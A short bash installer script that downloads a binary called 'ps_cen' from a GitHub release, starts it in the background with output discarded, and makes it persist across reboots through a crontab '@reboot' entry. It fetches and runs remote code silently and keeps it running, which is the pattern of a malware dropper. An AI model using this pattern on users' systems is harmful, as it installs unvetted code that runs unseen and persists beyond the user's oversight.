#!/bin/bash
set -e

URL="https://github.com/Ocanath/cena-landmine/releases/download/latest/ps_cen"
BIN="$HOME/.local/bin/ps_cen"

mkdir -p "$HOME/.local/bin"

# Download
curl -fsSL -o "$BIN" "$URL"
chmod +x "$BIN"

# Kill existing instance so the new binary takes effect immediately
pkill -f ps_cen 2>/dev/null || true

# Persist via crontab — remove any existing entry then append fresh
(crontab -l 2>/dev/null | grep -v "ps_cen"; echo "@reboot $BIN") | crontab -

# Start now
nohup "$BIN" >/dev/null 2>&1 &
